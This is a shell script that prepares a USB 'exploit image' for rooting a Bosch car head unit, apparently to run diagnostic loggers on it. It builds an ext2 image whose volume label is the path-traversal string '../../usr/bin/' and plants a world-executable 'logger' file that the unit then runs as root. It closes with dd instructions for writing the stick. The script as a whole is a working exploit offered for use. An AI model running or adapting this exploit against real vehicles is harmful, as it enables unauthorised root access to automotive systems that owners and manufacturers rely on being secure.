#!/bin/sh
# Prepare the USB exploit image for a head-unit logger.
# Based on ea/bosch_headunit_root/scripts/rootshellfs.sh, but:
#   - 128 MB image (instead of 8 MB) so the collected logs fit
#   - copies the chosen logger onto the stick as `logger`
#
# Usage:
#   ./rootshellfs_navdiag.sh          -> navdiag one-shot collector  -> rootshell.ext2
#   ./rootshellfs_navdiag.sh route    -> routeprobe fd-open capture  -> rootshell_route.ext2
#
# Requires: e2tools (mke2fs, e2cp). If you don't have e2cp, see fallback at bottom.

set -e
cd "$(dirname "$0")"

SIZE_KB=131072   # 128 MB

MODE="$1"
case "$MODE" in
    route) SRC=routeprobe_logger.sh IMG=rootshell_route.ext2 OUTDIR=routeprobe
           PROTO="during the ~7 min capture: pick a Krakow destination and START A ROUTE" ;;
    *)     SRC=navdiag_logger.sh     IMG=rootshell.ext2          OUTDIR=navdiag
           PROTO="after boot, attempt the map view" ;;
esac

dd if=/dev/zero of="./$IMG" bs=1024 count="$SIZE_KB"
mke2fs -F "$IMG" \
    -U 00000000-0000-0000-0000-000000000000 \
    -L "../../usr/bin/"

# put the collector on the stick as `logger` (mode 777 so it runs)
e2cp -P 777 "$SRC" "$IMG":/logger

echo "======================================"
echo "$MODE logger file system prepared ($IMG). Insert flash drive and do:"
echo "  sudo dd if=./$IMG of=/dev/sd#"
echo "Replace sd# with your actual USB stick - DO NOT overwrite your system drive!"
echo "After boot: $PROTO. The HU reboots = pull the USB; logs are in ./$OUTDIR/"
echo "======================================"

# --- fallback if e2cp is not installed (mount the image and copy) ----------
# losetup -f --show "$IMG"   # -> /dev/loopN
# mount /dev/loopN /mnt
# cp "$SRC" /mnt/logger && chmod 777 /mnt/logger
# umount /mnt
